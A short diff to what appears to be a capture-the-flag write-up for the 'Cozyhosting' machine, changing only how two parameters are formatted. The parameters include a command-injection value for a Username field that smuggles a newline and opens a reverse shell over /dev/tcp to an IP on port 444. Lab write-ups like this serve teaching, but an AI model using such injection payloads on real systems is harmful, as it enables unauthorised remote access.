@@ -91,8 +91,8 @@ In order to check the execution, a 404 HTTP GET request will be performed agains
 
 •	Using that cookie access the Admin dashboard and insert
 
-   - Hostname parameter: localhost
-   - Username parameter: kanderson@%0A(sh)0>/dev/tcp/10.10.14.10/444;a
+   - Hostname parameter ```localhost```
+   - Username parameter ```kanderson@%0A(sh)0>/dev/tcp/10.10.14.10/444;a```
  
 ![image](images/Cozyhosting/Imagen19.png)
 
